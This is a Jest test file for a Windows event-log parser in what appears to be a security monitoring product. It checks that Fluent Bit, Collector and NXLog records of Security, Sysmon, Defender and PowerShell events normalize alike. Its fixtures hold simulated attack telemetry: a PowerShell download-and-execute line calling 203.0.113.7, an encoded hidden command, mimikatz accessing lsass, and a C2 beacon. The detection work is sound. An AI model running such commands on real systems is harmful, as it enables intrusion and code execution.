import { describe, expect, test } from "@jest/globals";
import NormalizedSecurityEvent from "../../../../Types/SecurityEvent/NormalizedSecurityEvent";
import WindowsEventLogParser, {
  WINDOWS_PROVIDERS,
  getWindowsEventIds,
} from "../../../../Utils/SecurityEvent/LogParsers/WindowsEventLogParser";
import {
  STRING_INSERT_FIELDS,
  STRING_INSERT_MINIMUM_COUNTS,
  WindowsEventRecord,
  getStringInsertNames,
  readWindowsEventRecord,
} from "../../../../Utils/SecurityEvent/LogParsers/WindowsEventRecord";
import { logLine } from "./LogParserFixtures";
import {
  WindowsEventSpec,
  collectorOtlpBody,
  fluentBitBody,
  nxlogBody,
  xmlBody,
} from "./WindowsEventFixtures";

/*
 * Fluent Bit's winevtlog input sends an event's fields by position only
 * (StringInserts). The Windows parser names them from a layout per event
 * (WindowsEventRecord's STRING_INSERT_FIELDS), so an event shipped by Fluent
 * Bit reads exactly as the same event from the OpenTelemetry Collector or
 * NXLog does, which name their fields themselves.
 *
 * Each event below is written with its fields in the order Microsoft's
 * documentation of the event lists them (and Sysmon's schema 4.90), with
 * made-up accounts and documentation addresses. That order is what the
 * layouts are held to: a field moved one place in a layout reads another
 * field's value, and fails here.
 */

const SECURITY: string = WINDOWS_PROVIDERS.securityAuditing;
const COMPUTER: string = "WIN-01.corp.example";

function spec(
  eventId: number,
  provider: string,
  channel: string,
  data: Array<[string, string]>,
  extra: Partial<WindowsEventSpec> = {},
): WindowsEventSpec {
  return { eventId, provider, channel, computer: COMPUTER, data, ...extra };
}

const SUBJECT: Array<[string, string]> = [
  ["SubjectUserSid", "S-1-5-21-1004336348-1177238915-682003330-1104"],
  ["SubjectUserName", "bob"],
  ["SubjectDomainName", "CORP"],
  ["SubjectLogonId", "0x3e7a1"],
];

const ACCOUNT: Array<[string, string]> = [
  ["TargetUserName", "mallory"],
  ["TargetDomainName", "CORP"],
  ["TargetSid", "S-1-5-21-1004336348-1177238915-682003330-2002"],
];

const MEMBER_ADDED: Array<[string, string]> = [
  ["MemberName", "CN=Mallory Example,OU=Staff,DC=corp,DC=example"],
  ["MemberSid", "S-1-5-21-1004336348-1177238915-682003330-2002"],
  ["TargetUserName", "Domain Admins"],
  ["TargetDomainName", "CORP"],
  ["TargetSid", "S-1-5-21-1004336348-1177238915-682003330-512"],
  ...SUBJECT,
  ["PrivilegeList", "-"],
];

const DEFENDER_FOUND: Array<[string, string]> = [
  ["Product Name", "Microsoft Defender Antivirus"],
  ["Product Version", "4.18.25090.3"],
  ["Detection ID", "{2C8F1C47-5E62-4A4B-9A39-8F1F3D0C5A11}"],
  ["Detection Time", "2026-10-30T10:00:00.000Z"],
  ["Unused", ""],
  ["Unused2", ""],
  ["Threat ID", "2147519003"],
  ["Threat Name", "Trojan:Win32/Mimikatz.A"],
  ["Severity ID", "5"],
  ["Severity Name", "Severe"],
  ["Category ID", "8"],
  ["Category Name", "Trojan"],
  ["FWLink", "https://go.microsoft.com/fwlink/?linkid=37020"],
  ["Status Code", "1"],
  ["Status Description", ""],
  ["State", "1"],
  ["Source ID", "3"],
  ["Source Name", "Real-Time Protection"],
  ["Process Name", "C:\\Windows\\explorer.exe"],
  ["Detection User", "CORP\\alice"],
  ["Unused3", ""],
  ["Path", "file:_C:\\Users\\alice\\Downloads\\mimikatz.exe"],
  ["Origin ID", "4"],
  ["Origin Name", "Internet"],
  ["Execution ID", "0"],
  ["Execution Name", "Unknown"],
  ["Type ID", "0"],
  ["Type Name", "Concrete"],
  ["Pre Execution Status", "0"],
  ["Action ID", "9"],
  ["Action Name", "Not Applicable"],
  ["Unused4", ""],
  ["Error Code", "0x00000000"],
  ["Error Description", "The operation completed successfully."],
  ["Unused5", ""],
  ["Post Clean Status", "0"],
  ["Additional Actions ID", "0"],
  ["Additional Actions String", "No additional actions required"],
  ["Remediation User", ""],
  ["Unused6", ""],
  ["Security intelligence Version", "AV: 1.441.112.0"],
  ["Engine Version", "AM: 1.1.25090.3"],
];

const SYSMON_PROCESS: Array<[string, string]> = [
  ["RuleName", "-"],
  ["UtcTime", "2026-10-30 10:00:00.123"],
  ["ProcessGuid", "{5B0B8C3E-1A2B-6720-0000-0010F1C2D300}"],
  ["ProcessId", "4242"],
  ["Image", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"],
  ["FileVersion", "10.0.20348.1"],
  ["Description", "Windows PowerShell"],
  ["Product", "Microsoft® Windows® Operating System"],
  ["Company", "Microsoft Corporation"],
  ["OriginalFileName", "PowerShell.EXE"],
  ["CommandLine", "powershell.exe -nop -w hidden -enc SQBFAFgA"],
  ["CurrentDirectory", "C:\\Users\\alice\\"],
  ["User", "CORP\\alice"],
  ["LogonGuid", "{5B0B8C3E-0000-0000-0000-0020E6C30300}"],
  ["LogonId", "0x3C3E6"],
  ["TerminalSessionId", "1"],
  ["IntegrityLevel", "High"],
  [
    "Hashes",
    "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
  ],
  ["ParentProcessGuid", "{5B0B8C3E-1A2A-6720-0000-0010E1B2C300}"],
  ["ParentProcessId", "4100"],
  ["ParentImage", "C:\\Windows\\System32\\cmd.exe"],
  ["ParentCommandLine", "cmd.exe /c start.bat"],
  ["ParentUser", "CORP\\alice"],
];

/*
 * The events the parser reads a field of, each with every field Windows
 * writes for it, in order: what a reader needs from it, read the same way
 * from Fluent Bit as from a source that names its fields.
 */
const EVENTS: Array<[string, WindowsEventSpec]> = [
  [
    "explicit credentials (4648)",
    spec(4648, SECURITY, "Security", [
      ...SUBJECT,
      ["LogonGuid", "{00000000-0000-0000-0000-000000000000}"],
      ["TargetUserName", "administrator"],
      ["TargetDomainName", "CORP"],
      ["TargetLogonGuid", "{00000000-0000-0000-0000-000000000000}"],
      ["TargetServerName", "dc-01.corp.example"],
      ["TargetInfo", "dc-01.corp.example"],
      ["ProcessId", "0x1a2c"],
      ["ProcessName", "C:\\Windows\\System32\\runas.exe"],
      ["IpAddress", "203.0.113.7"],
      ["IpPort", "0"],
    ]),
  ],
  [
    "a service installed (4697)",
    spec(4697, SECURITY, "Security", [
      ...SUBJECT,
      ["ServiceName", "PSEXESVC"],
      ["ServiceFileName", "%SystemRoot%\\PSEXESVC.exe"],
      ["ServiceType", "0x10"],
      ["ServiceStartType", "3"],
      ["ServiceAccount", "LocalSystem"],
    ]),
  ],
  [
    "a scheduled task created (4698)",
    spec(4698, SECURITY, "Security", [
      ...SUBJECT,
      ["TaskName", "\\Updater"],
      [
        "TaskContent",
        "<Task><Actions><Exec><Command>powershell.exe</Command></Exec></Actions></Task>",
      ],
    ]),
  ],
  [
    "a scheduled task updated (4702)",
    spec(4702, SECURITY, "Security", [
      ...SUBJECT,
      ["TaskName", "\\Updater"],
      ["TaskContentNew", "<Task/>"],
    ]),
  ],
  [
    "the audit policy changed (4719)",
    spec(4719, SECURITY, "Security", [
      ...SUBJECT,
      ["CategoryId", "%%8274"],
      ["SubcategoryId", "%%12544"],
      ["SubcategoryGuid", "{0CCE9215-69AE-11D9-BED3-505054503030}"],
      ["AuditPolicyChanges", "%%8448"],
    ]),
  ],
  [
    "an account created (4720)",
    spec(4720, SECURITY, "Security", [
      ...ACCOUNT,
      ...SUBJECT,
      ["PrivilegeList", "-"],
      ["SamAccountName", "mallory"],
      ["DisplayName", "%%1793"],
      ["UserPrincipalName", "-"],
      ["HomeDirectory", "%%1793"],
      ["HomePath", "%%1793"],
      ["ScriptPath", "%%1793"],
      ["ProfilePath", "%%1793"],
      ["UserWorkstations", "%%1793"],
      ["PasswordLastSet", "%%1794"],
      ["AccountExpires", "%%1794"],
      ["PrimaryGroupId", "513"],
      ["AllowedToDelegateTo", "-"],
      ["OldUacValue", "0x0"],
      ["NewUacValue", "0x15"],
      ["UserAccountControl", "%%2080 %%2082 %%2084"],
      ["UserParameters", "%%1793"],
      ["SidHistory", "-"],
      ["LogonHours", "%%1797"],
    ]),
  ],
  [
    "a password reset (4724)",
    spec(4724, SECURITY, "Security", [...ACCOUNT, ...SUBJECT]),
  ],
  [
    "an account deleted (4726)",
    spec(4726, SECURITY, "Security", [
      ...ACCOUNT,
      ...SUBJECT,
      ["PrivilegeList", "-"],
    ]),
  ],
  [
    "a member added to a global group (4728)",
    spec(4728, SECURITY, "Security", MEMBER_ADDED),
  ],
  [
    "a member added to a local group (4732)",
    spec(4732, SECURITY, "Security", [
      ...MEMBER_ADDED.slice(0, 2),
      ["TargetUserName", "Administrators"],
      ["TargetDomainName", "Builtin"],
      ["TargetSid", "S-1-5-32-544"],
      ...MEMBER_ADDED.slice(5),
    ]),
  ],
  [
    "an account locked out (4740)",
    spec(4740, SECURITY, "Security", [
      ["TargetUserName", "alice"],
      ["TargetDomainName", "WKS-07"],
      ["TargetSid", "S-1-5-21-1004336348-1177238915-682003330-1105"],
      ...SUBJECT,
    ]),
  ],
  [
    "an account unlocked (4767)",
    spec(4767, SECURITY, "Security", [...ACCOUNT, ...SUBJECT]),
  ],
  [
    "Kerberos pre-authentication failed (4771)",
    spec(4771, SECURITY, "Security", [
      ["TargetUserName", "alice"],
      ["TargetSid", "S-1-5-21-1004336348-1177238915-682003330-1105"],
      ["ServiceName", "krbtgt/CORP"],
      ["TicketOptions", "0x40810010"],
      ["Status", "0x18"],
      ["PreAuthType", "2"],
      ["IpAddress", "::ffff:203.0.113.7"],
      ["IpPort", "51234"],
      ["CertIssuerName", ""],
      ["CertSerialNumber", ""],
      ["CertThumbprint", ""],
    ]),
  ],
  [
    "an account renamed (4781)",
    spec(4781, SECURITY, "Security", [
      ["OldTargetUserName", "mallory"],
      ["NewTargetUserName", "svc-backup"],
      ["TargetDomainName", "CORP"],
      ["TargetSid", "S-1-5-21-1004336348-1177238915-682003330-2002"],
      ...SUBJECT,
      ["PrivilegeList", "-"],
    ]),
  ],
  [
    "the Security log cleared (1102)",
    spec(1102, WINDOWS_PROVIDERS.eventLog, "Security", [], {
      userData: { name: "LogFileCleared", fields: SUBJECT },
    }),
  ],
  [
    "the System log cleared (104)",
    spec(104, WINDOWS_PROVIDERS.eventLog, "System", [], {
      userData: {
        name: "LogFileCleared",
        fields: [
          ["SubjectUserName", "bob"],
          ["SubjectDomainName", "CORP"],
          ["Channel", "System"],
          ["BackupPath", ""],
        ],
      },
    }),
  ],
  [
    "a service installed by the Service Control Manager (7045)",
    spec(7045, WINDOWS_PROVIDERS.serviceControlManager, "System", [
      ["ServiceName", "PSEXESVC"],
      ["ImagePath", "%SystemRoot%\\PSEXESVC.exe"],
      ["ServiceType", "user mode service"],
      ["StartType", "demand start"],
      ["AccountName", "LocalSystem"],
    ]),
  ],
  [
    "a suspicious script block (4104)",
    spec(
      4104,
      WINDOWS_PROVIDERS.powerShell,
      "Microsoft-Windows-PowerShell/Operational",
      [
        ["MessageNumber", "1"],
        ["MessageTotal", "1"],
        [
          "ScriptBlockText",
          "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a')",
        ],
        ["ScriptBlockId", "7c0b6a54-3c8b-4c58-9a9f-5d7f0a2b1c3d"],
        ["Path", "C:\\Users\\alice\\run.ps1"],
      ],
      { level: "Warning" },
    ),
  ],
  [
    "Microsoft Defender found malware (1116)",
    spec(
      1116,
      WINDOWS_PROVIDERS.defender,
      "Microsoft-Windows-Windows Defender/Operational",
      DEFENDER_FOUND,
    ),
  ],
  [
    "Microsoft Defender acted on it (1117)",
    spec(
      1117,
      WINDOWS_PROVIDERS.defender,
      "Microsoft-Windows-Windows Defender/Operational",
      DEFENDER_FOUND.map(
        ([name, value]: [string, string]): [string, string] => {
          return [name, name === "Action Name" ? "Quarantine" : value];
        },
      ),
    ),
  ],
  [
    "Microsoft Defender's configuration changed (5007)",
    spec(
      5007,
      WINDOWS_PROVIDERS.defender,
      "Microsoft-Windows-Windows Defender/Operational",
      [
        ["Product Name", "Microsoft Defender Antivirus"],
        ["Product Version", "4.18.25090.3"],
        [
          "Old Value",
          "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0",
        ],
        [
          "New Value",
          "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x1",
        ],
      ],
    ),
  ],
  [
    "Sysmon: a process created (1)",
    spec(
      1,
      WINDOWS_PROVIDERS.sysmon,
      "Microsoft-Windows-Sysmon/Operational",
      SYSMON_PROCESS,
    ),
  ],
  [
    "Sysmon: a network connection (3)",
    spec(3, WINDOWS_PROVIDERS.sysmon, "Microsoft-Windows-Sysmon/Operational", [
      ["RuleName", "-"],
      ["UtcTime", "2026-10-30 10:00:00.123"],
      ["ProcessGuid", "{5B0B8C3E-1A2B-6720-0000-0010F1C2D300}"],
      ["ProcessId", "4242"],
      ["Image", "C:\\Users\\alice\\AppData\\Local\\Temp\\beacon.exe"],
      ["User", "CORP\\alice"],
      ["Protocol", "tcp"],
      ["Initiated", "true"],
      ["SourceIsIpv6", "false"],
      ["SourceIp", "192.0.2.10"],
      ["SourceHostname", "WKS-07.corp.example"],
      ["SourcePort", "50123"],
      ["SourcePortName", "-"],
      ["DestinationIsIpv6", "false"],
      ["DestinationIp", "203.0.113.50"],
      ["DestinationHostname", "c2.example"],
      ["DestinationPort", "443"],
      ["DestinationPortName", "https"],
    ]),
  ],
  [
    "Sysmon: a thread started in another process (8)",
    spec(8, WINDOWS_PROVIDERS.sysmon, "Microsoft-Windows-Sysmon/Operational", [
      ["RuleName", "-"],
      ["UtcTime", "2026-10-30 10:00:00.123"],
      ["SourceProcessGuid", "{5B0B8C3E-1A2B-6720-0000-0010F1C2D300}"],
      ["SourceProcessId", "4242"],
      ["SourceImage", "C:\\Users\\alice\\AppData\\Local\\Temp\\loader.exe"],
      ["TargetProcessGuid", "{5B0B8C3E-0001-6720-0000-0010A1B2C300}"],
      ["TargetProcessId", "812"],
      ["TargetImage", "C:\\Windows\\explorer.exe"],
      ["NewThreadId", "5120"],
      ["StartAddress", "0x00007FF6A0B10000"],
      ["StartModule", "-"],
      ["StartFunction", "-"],
      ["SourceUser", "CORP\\alice"],
      ["TargetUser", "CORP\\alice"],
    ]),
  ],
  [
    "Sysmon: lsass opened (10)",
    spec(10, WINDOWS_PROVIDERS.sysmon, "Microsoft-Windows-Sysmon/Operational", [
      ["RuleName", "-"],
      ["UtcTime", "2026-10-30 10:00:00.123"],
      ["SourceProcessGUID", "{5B0B8C3E-1A2B-6720-0000-0010F1C2D300}"],
      ["SourceProcessId", "4242"],
      ["SourceThreadId", "5120"],
      ["SourceImage", "C:\\Users\\alice\\AppData\\Local\\Temp\\mimikatz.exe"],
      ["TargetProcessGUID", "{5B0B8C3E-0001-6720-0000-0010A1B2C301}"],
      ["TargetProcessId", "664"],
      ["TargetImage", "C:\\Windows\\system32\\lsass.exe"],
      ["GrantedAccess", "0x1010"],
      ["CallTrace", "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4"],
      ["SourceUser", "CORP\\alice"],
      ["TargetUser", "NT AUTHORITY\\SYSTEM"],
    ]),
  ],
  [
    "Sysmon: a file created (11)",
    spec(11, WINDOWS_PROVIDERS.sysmon, "Microsoft-Windows-Sysmon/Operational", [
      ["RuleName", "-"],
      ["UtcTime", "2026-10-30 10:00:00.123"],
      ["ProcessGuid", "{5B0B8C3E-1A2B-6720-0000-0010F1C2D300}"],
      ["ProcessId", "4242"],
      [
        "Image",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      ],
      [
        "TargetFilename",
        "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.lnk",
      ],
      ["CreationUtcTime", "2026-10-30 10:00:00.120"],
      ["User", "CORP\\alice"],
    ]),
  ],
  [
    "Sysmon: a registry value set (13)",
    spec(13, WINDOWS_PROVIDERS.sysmon, "Microsoft-Windows-Sysmon/Operational", [
      ["RuleName", "-"],
      ["EventType", "SetValue"],
      ["UtcTime", "2026-10-30 10:00:00.123"],
      ["ProcessGuid", "{5B0B8C3E-1A2B-6720-0000-0010F1C2D300}"],
      ["ProcessId", "4242"],
      ["Image", "C:\\Windows\\regedit.exe"],
      [
        "TargetObject",
        "HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
      ],
      ["Details", "C:\\Users\\alice\\updater.exe"],
      ["User", "CORP\\alice"],
    ]),
  ],
  [
    "Sysmon: a DNS query (22)",
    spec(22, WINDOWS_PROVIDERS.sysmon, "Microsoft-Windows-Sysmon/Operational", [
      ["RuleName", "-"],
      ["UtcTime", "2026-10-30 10:00:00.123"],
      ["ProcessGuid", "{5B0B8C3E-1A2B-6720-0000-0010F1C2D300}"],
      ["ProcessId", "4242"],
      ["QueryName", "c2.example"],
      ["QueryStatus", "0"],
      ["QueryResults", "::ffff:203.0.113.50;"],
      ["Image", "C:\\Users\\alice\\AppData\\Local\\Temp\\beacon.exe"],
      ["User", "CORP\\alice"],
    ]),
  ],
];

function parseOne(body: string): NormalizedSecurityEvent {
  const events: Array<NormalizedSecurityEvent> = WindowsEventLogParser.parse(
    logLine(body),
  );

  expect(events).toHaveLength(1);

  return events[0]!;
}

// What a reader made of an event, beside how it was shipped.
function reading(event: NormalizedSecurityEvent): Record<string, unknown> {
  return {
    className: event.className,
    activityName: event.activityName,
    statusName: event.statusName,
    severityName: event.severityName,
    message: event.message,
    ruleName: event.ruleName,
    principalUser: event.principalUser,
    principalHost: event.principalHost,
    principalIp: event.principalIp,
    principalProcess: event.principalProcess,
    processName: event.processName,
    processPath: event.processPath,
    processCommandLine: event.processCommandLine,
    parentProcessName: event.parentProcessName,
    parentProcessCommandLine: event.parentProcessCommandLine,
    targetUser: event.targetUser,
    targetHost: event.targetHost,
    targetIp: event.targetIp,
    targetPort: event.targetPort,
    targetResource: event.targetResource,
  };
}

describe("Fluent Bit's winevtlog reads as the sources that name their fields", () => {
  test.each(EVENTS)(
    "%s: every field is named, in the order Windows writes it",
    (_title: string, event: WindowsEventSpec) => {
      const shipped: WindowsEventRecord = readWindowsEventRecord(
        fluentBitBody(event),
      )!;
      const named: WindowsEventRecord = readWindowsEventRecord(xmlBody(event))!;

      for (const [name, value] of [
        ...(event.data || []),
        ...(event.userData?.fields || []),
      ]) {
        expect([name, shipped.data[name]]).toEqual([name, value]);
      }

      // Nothing is left by position, and nothing is named twice.
      expect(
        Object.keys(shipped.data).filter((name: string): boolean => {
          return name.startsWith("param");
        }),
      ).toEqual([]);
      expect(shipped.data).toEqual(named.data);
    },
  );

  test.each(EVENTS)(
    "%s: becomes the same security event as from the collector and NXLog",
    (_title: string, event: WindowsEventSpec) => {
      const fromFluentBit: NormalizedSecurityEvent = parseOne(
        fluentBitBody(event),
      );

      expect(reading(fromFluentBit)).toEqual(
        reading(parseOne(collectorOtlpBody(event))),
      );
      expect(reading(fromFluentBit)).toEqual(
        reading(parseOne(nxlogBody(event))),
      );
    },
  );

  test("what the readers read is there: the user, the address, the process, the threat", () => {
    const byTitle: Map<string, NormalizedSecurityEvent> = new Map(
      EVENTS.map(
        ([title, event]: [string, WindowsEventSpec]): [
          string,
          NormalizedSecurityEvent,
        ] => {
          return [title, parseOne(fluentBitBody(event))];
        },
      ),
    );

    expect(byTitle.get("explicit credentials (4648)")!.targetUser).toBe(
      "administrator",
    );
    expect(byTitle.get("explicit credentials (4648)")!.principalIp).toBe(
      "203.0.113.7",
    );
    expect(byTitle.get("a service installed (4697)")!.targetResource).toBe(
      "PSEXESVC",
    );
    expect(
      byTitle.get("a member added to a global group (4728)")!.message,
    ).toBe(
      "Mallory Example added to Domain Admins on WIN-01.corp.example by bob",
    );
    expect(
      byTitle.get("a member added to a global group (4728)")!.severityName,
    ).toBe("Medium");
    expect(
      byTitle.get("Kerberos pre-authentication failed (4771)")!.message,
    ).toBe(
      "Kerberos pre-authentication failed for alice from 203.0.113.7: wrong password",
    );
    expect(byTitle.get("an account renamed (4781)")!.targetUser).toBe(
      "svc-backup",
    );
    expect(byTitle.get("the Security log cleared (1102)")!.message).toBe(
      "The Security log was cleared on WIN-01.corp.example by CORP\\bob",
    );
    expect(
      byTitle.get("a service installed by the Service Control Manager (7045)")!
        .processCommandLine,
    ).toBe("%SystemRoot%\\PSEXESVC.exe");
    expect(
      byTitle.get("a suspicious script block (4104)")!.targetResource,
    ).toBe("C:\\Users\\alice\\run.ps1");
    expect(
      byTitle.get("Microsoft Defender found malware (1116)")!.ruleName,
    ).toBe("Trojan:Win32/Mimikatz.A");
    expect(
      byTitle.get("Microsoft Defender found malware (1116)")!.severityName,
    ).toBe("Critical");
    expect(
      byTitle.get("Microsoft Defender found malware (1116)")!.targetResource,
    ).toBe("C:\\Users\\alice\\Downloads\\mimikatz.exe");
    expect(
      byTitle.get("Microsoft Defender acted on it (1117)")!.message,
    ).toContain("Quarantine");
    expect(
      byTitle.get("Sysmon: a process created (1)")!.processCommandLine,
    ).toBe("powershell.exe -nop -w hidden -enc SQBFAFgA");
    expect(
      byTitle.get("Sysmon: a process created (1)")!.parentProcessName,
    ).toBe("cmd.exe");
    expect(byTitle.get("Sysmon: a network connection (3)")!.targetIp).toBe(
      "203.0.113.50",
    );
    expect(byTitle.get("Sysmon: a network connection (3)")!.targetPort).toBe(
      443,
    );
    expect(byTitle.get("Sysmon: lsass opened (10)")!.severityName).toBe(
      "Medium",
    );
    expect(byTitle.get("Sysmon: a DNS query (22)")!.targetResource).toBe(
      "c2.example",
    );
  });
});

describe("a layout is used only where it fits", () => {
  test("Sysmon before version 10 wrote its process creation without OriginalFileName: it stays by position", () => {
    const withoutOriginalFileName: Array<[string, string]> =
      SYSMON_PROCESS.filter(([name]: [string, string]): boolean => {
        return name !== "OriginalFileName" && name !== "ParentUser";
      });
    const old: WindowsEventRecord = readWindowsEventRecord(
      fluentBitBody(
        spec(
          1,
          WINDOWS_PROVIDERS.sysmon,
          "Microsoft-Windows-Sysmon/Operational",
          withoutOriginalFileName,
        ),
      ),
    )!;

    expect(withoutOriginalFileName).toHaveLength(21);
    // Not CommandLine read as OriginalFileName, one place off.
    expect(old.data["OriginalFileName"]).toBeUndefined();
    expect(old.data["param11"]).toBe("C:\\Users\\alice\\");
    expect(STRING_INSERT_MINIMUM_COUNTS.get("microsoft-windows-sysmon:1")).toBe(
      22,
    );
  });

  test("Sysmon 10 to 13 wrote it without ParentUser at the end: every field it has is named", () => {
    const withoutParentUser: Array<[string, string]> = SYSMON_PROCESS.slice(
      0,
      -1,
    );
    const record: WindowsEventRecord = readWindowsEventRecord(
      fluentBitBody(
        spec(
          1,
          WINDOWS_PROVIDERS.sysmon,
          "Microsoft-Windows-Sysmon/Operational",
          withoutParentUser,
        ),
      ),
    )!;

    expect(record.data["CommandLine"]).toBe(
      "powershell.exe -nop -w hidden -enc SQBFAFgA",
    );
    expect(record.data["ParentUser"]).toBeUndefined();
  });

  test("a newer version's fields past the layout's end stay by position", () => {
    const record: WindowsEventRecord = readWindowsEventRecord(
      fluentBitBody(
        spec(4697, SECURITY, "Security", [
          ...SUBJECT,
          ["ServiceName", "PSEXESVC"],
          ["ServiceFileName", "%SystemRoot%\\PSEXESVC.exe"],
          ["ServiceType", "0x10"],
          ["ServiceStartType", "3"],
          ["ServiceAccount", "LocalSystem"],
          ["SomethingNew", "x"],
        ]),
      ),
    )!;

    expect(record.data["ServiceAccount"]).toBe("LocalSystem");
    expect(record.data["param10"]).toBe("x");
  });

  test("a provider is matched whatever its case, and an event with no layout has none", () => {
    expect(
      getStringInsertNames({
        provider: "MICROSOFT-WINDOWS-SECURITY-AUDITING",
        eventId: 4648,
        insertCount: 14,
      })[5],
    ).toBe("TargetUserName");
    expect(
      getStringInsertNames({
        provider: WINDOWS_PROVIDERS.sysmon,
        eventId: 2,
        insertCount: 9,
      }),
    ).toEqual([]);
    expect(
      getStringInsertNames({
        provider: "constructor",
        eventId: 1,
        insertCount: 30,
      }),
    ).toEqual([]);
  });
});

/*
 * Every event a reader reads a field of has a layout - or is listed below
 * with why it has none - so a reader added for a new event cannot read an
 * empty field from every Fluent Bit record without anyone noticing.
 */
const WITHOUT_LAYOUT: Record<string, string> = {
  "service control manager:7040":
    "Windows names its fields param1 to param4 itself, which is what the reader reads",
  "microsoft-windows-windows defender:5001":
    "the reader reads no field: protection turned off is the event",
  "microsoft-windows-windows defender:5010":
    "the reader reads no field: scanning turned off is the event",
  "microsoft-windows-windows defender:5012":
    "the reader reads no field: scanning turned off is the event",
  "microsoft-windows-windows defender:1006":
    "the older engine's event: its layout is not documented, so its threat stays by position",
  "microsoft-windows-windows defender:1007":
    "the older engine's event: its layout is not documented, so its threat stays by position",
  "microsoft-windows-windows defender:1008":
    "the older engine's event: its layout is not documented, so its threat stays by position",
  "microsoft-windows-windows defender:1015":
    "the behavior event's layout is not documented, so its threat stays by position",
  "microsoft-windows-windows defender:1121":
    "attack surface reduction's layout differs between versions, so its path stays by position",
  "microsoft-windows-windows defender:1122":
    "attack surface reduction's layout differs between versions, so its path stays by position",
};

const SYSMON_WITH_LAYOUT: ReadonlyArray<string> = [
  "1",
  "3",
  "8",
  "10",
  "11",
  "13",
  "22",
];

describe("STRING_INSERT_FIELDS covers what the readers read", () => {
  test("every event read but Sysmon's rarer ones has a layout, or a reason it has none", () => {
    const missing: Array<string> = [];

    for (const provider of [
      WINDOWS_PROVIDERS.securityAuditing,
      WINDOWS_PROVIDERS.eventLog,
      WINDOWS_PROVIDERS.serviceControlManager,
      WINDOWS_PROVIDERS.defender,
      WINDOWS_PROVIDERS.powerShell,
    ]) {
      for (const id of getWindowsEventIds(provider)) {
        const key: string = `${provider.toLowerCase()}:${id}`;

        if (!STRING_INSERT_FIELDS.has(key) && !WITHOUT_LAYOUT[key]) {
          missing.push(key);
        }
      }
    }

    expect(missing).toEqual([]);

    // The list only names events the parser reads, and none it has a layout for.
    for (const key of Object.keys(WITHOUT_LAYOUT)) {
      expect([key, STRING_INSERT_FIELDS.has(key)]).toEqual([key, false]);
    }
  });

  test("Sysmon's layouts are for the events a detection reads most: processes, connections, injection, lsass, files, the registry and DNS", () => {
    expect(
      getWindowsEventIds(WINDOWS_PROVIDERS.sysmon).filter((id: string) => {
        return STRING_INSERT_FIELDS.has(`microsoft-windows-sysmon:${id}`);
      }),
    ).toEqual(SYSMON_WITH_LAYOUT);
  });

  test("no layout names one field twice", () => {
    for (const [key, names] of STRING_INSERT_FIELDS) {
      expect([key, new Set(names).size]).toEqual([key, names.length]);
    }
  });
});
